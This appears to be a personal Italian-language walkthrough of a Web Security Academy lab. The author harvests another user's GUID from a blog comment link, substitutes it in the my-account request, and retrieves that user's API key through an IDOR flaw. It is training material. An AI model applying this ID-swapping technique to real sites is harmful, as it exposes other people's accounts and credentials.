
```
Your username is: wiener

Your API Key is: sXua37N0XuQsKwdvNofbF5fDruKbjOWL
```

forse per "triggerare" qualcosa di interessante, bisogna inserire un commento...

https://0aa200a703990b9780e68b7a00080008.web-security-academy.net/post?postId=7

![](_attachments/Pasted%20image%2020240905092047.png)

```html
<span id=blog-author><a href='/blogs?userId=8270a39d-7dc7-41cf-8d81-b3e9f3ce53f2'>wiener</a></span>
```

se trovo un commento di `carlos` dovrei vedere anche il suo GUID

![](_attachments/Pasted%20image%2020240905092347.png)

https://0aa200a703990b9780e68b7a00080008.web-security-academy.net/blogs?userId=019f114e-a51b-4e5f-994f-84e23b1910ab

probabilmente devo agire qui

`GET /my-account?id=8270a39d-7dc7-41cf-8d81-b3e9f3ce53f2 HTTP/2`



faccio questa richiesta con il GUID di carlos

```bash
GET /my-account?id=019f114e-a51b-4e5f-994f-84e23b1910ab HTTP/2
Host: 0aa200a703990b9780e68b7a00080008.web-security-academy.net
..
..
```

response

```html
                       <p>Your username is: carlos</p>
                        <div>Your API Key is: 70WPYBXMKs7MUh857yAAVJY0JR4vw7i7
```

